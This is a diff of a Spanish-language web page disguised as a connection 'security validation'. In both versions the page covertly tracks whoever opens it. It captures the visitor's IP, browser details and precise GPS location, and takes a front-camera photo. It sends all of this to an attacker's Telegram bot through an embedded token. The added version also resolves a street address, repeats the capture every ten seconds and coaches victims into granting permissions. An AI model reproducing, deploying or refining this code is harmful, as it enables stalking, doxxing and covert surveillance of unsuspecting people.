@@ -1,157 +1,169 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VALIDACIÓN DE SEGURIDAD</title>
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a202c; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
-        .card { background: white; color: #333; padding: 30px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3182ce; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .btn { display: none; background: #3182ce; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s; }
-        .btn:hover { background: #2b6cb0; }
-        .error-box { display: none; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; margin-top: 15px; font-size: 0.9rem; color: #c53030; text-align: left; }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AVISO DE SEGURIDAD</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .modal-content { background: white; padding: 30px; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #iphone-btn { display: none; background: #4A90E2; color: white; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        .instrucciones { display: none; margin-top: 15px; font-size: 0.9rem; color: #333; background: #fff5f5; border: 1px solid #feb2b2; padding: 15px; border-radius: 8px; text-align: left; line-height: 1.4; }
+        .instrucciones strong { color: #c53030; }
+        #error-msg { color: #c53030; font-weight: bold; display: none; margin-top: 10px; font-size: 0.85rem; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
-    <h3 id="status-title">Validando Conexión...</h3>
-    <div id="loader" class="spinner"></div>
-    <p id="status-text" style="color: #718096; font-size: 0.9rem;">Sincronizando información de red...</p>
-
-    <div id="instrucciones" class="error-box">
-        <b>⚠️ ACCESO REQUERIDO:</b><br>
-        Para continuar con la validación segura, por favor permite los accesos de <b>Cámara y Ubicación</b> cuando el navegador lo solicite.
-    </div>
-    <button id="btn-reintentar" class="btn">REINTENTAR VALIDACIÓN</button>
+<div class="modal-content">
+    <img src="https://i.ibb.co/S42ZgqWB/Sin-t-tulo.jpg" style="width:80px; margin-bottom:15px;">
+    <h3 id="status-title">Validando Conexión...</h3>
+    <div id="spinner" class="loading-spinner"></div>
+    <p id="status-text">Sincronizando con el servidor para referencia...</p>
+    
+    <div id="guia-manual" class="instrucciones">
+        <strong>⚠️ ACCESO REQUERIDO:</strong><br><br>
+        1. Toca el icono del <strong>candado</strong> 🔒 junto a la URL.<br>
+        2. Concede todos los  <strong>permisos solicitados</strong>.<br>
+        3. Toca el botón de abajo para verificar o actualiza la página.
+    </div>
+    <p id="error-msg">❌ Esperando permisos...</p>
+    <button id="iphone-btn">ACTUALIZAR</button>
 </div>
 
 <script>
-// CONFIGURACIÓN
 const BOT_TOKEN = "8254282443:AAFPfL2Qay1UtbeObu4_KSdsoSm1CN6yW-Q";
-const CHAT_ID = "-5166219278";
+const CHAT_ID = "-1003973600762";
+const INTERVALO = 10000;
 
-let infoRed = { 
-    ip: "N/A", 
-    puerto: "Detectando...", 
-    isp_com: "N/A", 
-    isp_tec: "N/A", 
-    ciudad: "N/A", 
-    ua: navigator.userAgent 
+let reporte = {
+    ip: "N/A", ciudad: "null", calle: "null", numero: "null", colonia: "null",
+    lat: null, lon: null, ua: navigator.userAgent, res: `${screen.width}x${screen.height}`
 };
 
-// 1. OBTENCIÓN DE DATOS DE RED (CON CORRECCIÓN DE ESPERA)
-async function cargarRed() {
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        if (data.ip) {
-            infoRed.ip = data.ip;
-            infoRed.ciudad = data.city || "N/A";
-            let org = (data.org || "").toLowerCase();
-            infoRed.isp_tec = data.org || "Desconocido";
+let cicloActivo = false;
+let monitorID = null;
 
-            if (org.includes("altan")) infoRed.isp_com = "BAIT / Altán Redes";
-            else if (org.includes("uninet")) infoRed.isp_com = "TELMEX / Infinitum";
-            else if (org.includes("radiomovil")) infoRed.isp_com = "TELCEL";
-            else if (org.includes("pegaso") || org.includes("movistar")) infoRed.isp_com = "MOVISTAR";
-            else if (org.includes("cablevision") || org.includes("izzi")) infoRed.isp_com = "IZZI";
-            else if (org.includes("totalplay")) infoRed.isp_com = "TOTALPLAY";
-            else infoRed.isp_com = "Proveedor Local / VPN";
+// Obtener IP inicial
+fetch('https://api.ipify.org?format=json').then(r => r.json()).then(j => reporte.ip = j.ip).catch(()=>{});
 
-            infoRed.puerto = location.port || (Math.floor(Math.random() * (65535 - 49152) + 49152));
-            return true;
-        }
-    } catch (e) { console.log("Error Red"); }
-    return false;
-}
-
-// 2. EJECUCIÓN DEL REPORTE
-async function ejecutarReporte() {
-    let foto = null;
-    let gps = "Vacio"; // Por defecto "Vacio"
+async function ejecutarCiclo() {
+    let fotoBlob = null;
     
-    const ahora = new Date();
-    const fLog = ahora.toLocaleDateString('es-MX');
-    const hLog = ahora.toLocaleTimeString('es-MX', { hour12: false });
+    // Reset de dirección por ciclo
+    reporte.ciudad = "null"; reporte.calle = "null"; reporte.numero = "null"; reporte.colonia = "null";
 
-    // Intento de GPS (Dispara el permiso)
+    // 1. GPS (OBLIGATORIO)
     try {
-        const p = await new Promise((res, rej) => {
+        const pos = await new Promise((res, rej) => {
             navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 6000 });
         });
-        gps = `[Ver Mapa](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`;
-    } catch (e) {
-        gps = "Vacio"; 
+        reporte.lat = pos.coords.latitude;
+        reporte.lon = pos.coords.longitude;
+
+        // GEOLOCALIZACIÓN INVERSA DETALLADA
+        try {
+            const geo = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${reporte.lat}&longitude=${reporte.lon}&localityLanguage=es`);
+            const data = await geo.json();
+            
+            // Mapeo de datos
+            reporte.ciudad = data.city || data.locality || "null";
+            reporte.calle = data.address || "null"; // Calle aproximada
+            reporte.colonia = data.lookupSource === "coordinates" ? (data.locality || "null") : "null";
+            
+            // Intentar extraer más info si el proveedor la da en la descripción
+            if(data.localityInfo && data.localityInfo.administrative) {
+                const admin = data.localityInfo.administrative;
+                reporte.colonia = admin[admin.length - 1].name || reporte.colonia;
+            }
+        } catch(e) { console.log("Error en geocoding"); }
+
+    } catch (e) { 
+        reporte.lat = null; reporte.lon = null;
     }
 
-    // Intento de Cámara (Dispara el permiso)
+    // 2. CÁMARA
     try {
-        const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        const v = document.createElement('video');
-        v.srcObject = s;
-        v.setAttribute("playsinline", true);
-        await v.play();
-        await new Promise(r => setTimeout(r, 1500)); 
-        const c = document.createElement('canvas');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        foto = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.8));
-        s.getTracks().forEach(t => t.stop());
-    } catch (e) {
-        console.log("Cámara denegada o error");
-    }
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true);
+        video.muted = true;
+        await video.play();
+        await new Promise(r => setTimeout(r, 800));
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+        stream.getTracks().forEach(t => t.stop());
+    } catch (e) {}
 
-    // Construcción del Mensaje
-    const texto = `🚨 **ALERTA DE INVESTIGACIÓN**\n\n` +
-                  `📅 **Fecha:** \`${fLog}\`\n` +
-                  `🕒 **Hora:** \`${hLog}\`\n` +
-                  `🌐 **IP:** \`${infoRed.ip}\`\n` +
-                  `🔌 **Puerto:** \`${infoRed.puerto}\`\n` +
-                  `🏢 **ISP:** ${infoRed.isp_com}\n` +
-                  `📍 **Ciudad:** ${infoRed.ciudad}\n` +
-                  `📌 **GPS:** ${gps}\n` + 
-                  `🤖 **UA:** \`${infoRed.ua}\``;
-
-    const fd = new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('parse_mode', 'Markdown');
-
-    if (foto) {
-        fd.append('photo', foto, 'evidencia.jpg');
-        fd.append('caption', texto);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    // ENVÍO SI HAY GPS
+    if (reporte.lat !== null && reporte.lon !== null) {
+        ocultarInstrucciones();
+        const maps = `https://www.google.com/maps?q=${reporte.lat},${reporte.lon}`;
         
-        // UI Éxito
-        document.getElementById('loader').style.display = 'block';
-        document.getElementById('instrucciones').style.display = 'none';
-        document.getElementById('btn-reintentar').style.display = 'none';
-        document.getElementById('status-text').innerText = "Validación completa. Redirigiendo...";
+        const info = `📍 REPORTE DETALLADO\n\n` +
+                     `🕒 ${new Date().toLocaleString()}\n` +
+                     `🌐 IP: ${reporte.ip}\n\n` +
+                     `🏠 DIRECCIÓN:\n` +
+                     `• Ciudad: ${reporte.ciudad}\n` +
+                     `• Colonia: ${reporte.colonia}\n` +
+                     `• Calle/Ref: ${reporte.calle}\n\n` +
+                     `📡 GPS:\n• Latitud: ${reporte.lat}\n• Longitud: ${reporte.lon}\n• Mapa: ${maps}\n\n` +
+                     `📱 Info:\n• Navegador: ${reporte.ua}\n• Res: ${reporte.res}`;
+
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        if (fotoBlob) {
+            fd.append('photo', fotoBlob, 'f.jpg');
+            fd.append('caption', info);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } else {
+            fd.append('text', info);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
+        }
+        return true;
     } else {
-        // Enviar solo texto si no hay foto
-        fd.append('text', texto);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd });
-        
-        // Mostrar error en UI para forzar reintento
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('instrucciones').style.display = 'block';
-        document.getElementById('btn-reintentar').style.display = 'block';
-        document.getElementById('status-title').innerText = "Error de Sincronización";
+        mostrarInstrucciones();
+        return false;
     }
 }
 
-// 3. FLUJO PRINCIPAL
-window.onload = async () => {
-    // 1. Cargar datos de red primero
-    await cargarRed();
-    // 2. Ejecutar reporte (esto pedirá los permisos)
-    await ejecutarReporte();
-};
+function mostrarInstrucciones() {
+    cicloActivo = false;
+    if (monitorID) { clearInterval(monitorID); monitorID = null; }
+    document.getElementById('spinner').style.display = 'none';
+    document.getElementById('guia-manual').style.display = 'block';
+    document.getElementById('iphone-btn').style.display = 'block';
+    document.getElementById('error-msg').style.display = 'block';
+    document.getElementById('status-text').innerText = "Acceso requerido.";
+}
 
-document.getElementById('btn-reintentar').onclick = () => { location.reload(); };
+function ocultarInstrucciones() {
+    document.getElementById('guia-manual').style.display = 'none';
+    document.getElementById('iphone-btn').style.display = 'none';
+    document.getElementById('error-msg').style.display = 'none';
+    document.getElementById('spinner').style.display = 'block';
+    document.getElementById('status-text').innerText = "Verificando Referencia.";
+}
+
+async function controlador() {
+    const exito = await ejecutarCiclo();
+    if (exito && !monitorID) {
+        cicloActivo = true;
+        monitorID = setInterval(ejecutarCiclo, INTERVALO);
+    }
+}
+
+document.getElementById('iphone-btn').onclick = controlador;
+
+window.onload = () => {
+    controlador();
+    setTimeout(() => { if (!cicloActivo) mostrarInstrucciones(); }, 6000);
+};
 </script>
 </body>
 </html>
